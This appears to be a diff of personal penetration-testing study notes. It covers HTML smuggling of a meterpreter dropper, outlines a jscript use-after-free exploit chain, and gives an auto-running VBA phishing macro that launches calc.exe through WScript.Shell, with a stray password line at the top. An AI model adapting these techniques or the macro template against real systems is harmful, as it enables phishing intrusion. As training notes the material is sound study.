@@ -1,3 +1,5 @@
+password: @Hide01
+
 # chapter 3 Windows concepts
 
 1. WOW  - Windows on windows. Most windows mahine sise the 64 bit version of the Windows Operating system. However many applications are still 32 bit.
@@ -113,8 +115,92 @@ Removing the entire directory
 ```
 However this makes the user manually click on the link. Instead we can make the lnk embedded javascript file.
 
-we will create a Base64 meterpreter
+we will create a Base64 meterpreter.
 
 
+### HTML smuggling directly
+
+Although this works well, it exposes the filename and extension of the dropper and requires the 
+user to manually click on the link. To avoid this we can trigger the download from an embedded 
+JavaScript file. This method feeds the file as an octet stream and will download the assembled 
+file without user interaction.
+
+# Day 5 cdac training
+
+## use and free exploit
+
+Patch diffing - Instruction to call the newly created object with `ScavVarList:Init`
+VAR structure -  gv block has 100 VAR structure, each var will have its 24 byte structure, type of variable, obj ptr and next var ptr
+VVAL structure - consist of structured va
+
+Can I do the stuff that I needed to do in due time, 
+
+Heap spray of fake vars
+leak vftable address of an object poinin to jscript.dll
+arbitary read primitive - kernel32.dll, ntfll.fll
+function names - winexec, ntcontinue
+Handling ASLR
+Trigger - Trigger using typeof operator
+create a fake object
+
+Converting use after free to a type confusion bug
+obj_ptr behaviour changes based on functionality
+
+find out ho ot run iexplore and windbg
+
+
+## Phishing in MS Office page 39
+
+creating macros is defined here
+
+```vb
+Sub Document_Open()
+    MyMacro
+
+End Sub
+
+Sub AutoOpen()
+    MyMacro
+End Sub
+
+Sub MyMacro()
+'
+' mymacro Macro
+'
+'
+'    Dim myString As String
+'    Dim myLong As Long
+'    Dim myPointer As LongPtr
+
+'    myLong = 1
+
+'    If myLong < 5 Then
+'        MsgBox ("Hi")
+'    Else
+'        MsgBox ("False")
+    
+'    End If
+
+'    For counter = 1 To 3
+'        MsgBox ("Hoo")
+'    Next counter
+
+    Dim str As String
+    str = "Hi " + Environ$("computername") + "!"
+    
+    MsgBox (str)
+    
+    MsgBox ("You are " + CreateObject("WScript.Network").ComputerName + ", right?")
+    'CreateObject("Wscript.Shell").Run str, 0
+    
+    MsgBox ("Lemme open a calculator for you!")
+    str = "calc.exe"
+    CreateObject("Wscript.Shell").Run str, 0
+    
+    'Shell str, vbHide
+    
+    MsgBox ("Bye")
+End Sub
+```
 
 
